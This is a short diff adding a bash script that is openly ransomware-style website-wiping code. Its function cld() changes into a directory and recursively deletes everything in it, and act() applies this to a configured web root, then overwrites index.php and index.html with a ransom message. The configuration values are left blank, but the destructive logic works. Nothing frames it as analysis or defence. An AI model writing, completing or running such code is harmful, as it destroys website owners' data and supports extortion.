@@ -1,0 +1,38 @@
+#!/usr/bin/env bash
+
+declare -r WEBROOT=
+
+declare -r RANSOM_MESSAGE=
+
+declare -r SLEEP_TIME=
+
+
+function cld() {
+
+    echo "Clearing $1"
+
+
+    [ ! -e "$1" ] && return
+
+    [ ! -d "$1" ] && return
+
+    [ -e "$1" ] && [ -d "$1" ] && cd "$1"
+
+    [ "$PWD" != "$1" ] && return
+
+    [ "$(ls $1)" ] && rm * -r
+
+    [ "$(ls $1)" ] && echo "00000000000000000" && return
+
+    [ ! -s "$1" ] && echo "==================="
+
+}
+
+function act() {
+
+    cld $WEBROOT
+    echo $RANSOM_MESSAGE >"$WEBROOT/index.php"
+    echo $RANSOM_MESSAGE >"$WEBROOT/index.html"
+}
+
+
